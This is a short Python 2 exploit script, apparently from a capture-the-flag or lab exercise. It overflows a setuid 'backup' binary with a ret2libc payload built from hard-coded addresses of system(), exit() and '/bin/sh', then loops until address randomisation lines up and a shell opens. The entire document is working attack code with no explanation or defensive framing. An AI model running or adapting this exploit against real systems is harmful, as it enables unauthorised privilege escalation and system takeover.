import struct, subprocess
libc = 0xf75e2000
sysOffset = 0x0003a940
sysAddress = libc + sysOffset
exitOffset = 0x0002e7b0
exitAddress = libc + exitOffset
binsh = libc + 0x0015900b
payload = "A" * 512
payload += struct.pack("<I", sysAddress)
payload += struct.pack("<I", exitAddress)
payload += struct.pack("<I", binsh)
attempts = 0
while True:
  attempts += 1
  print "Attempts: " + str(attempts)
  subprocess.call(["/usr/local/bin/backup", "-i",
"3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110",
payload])
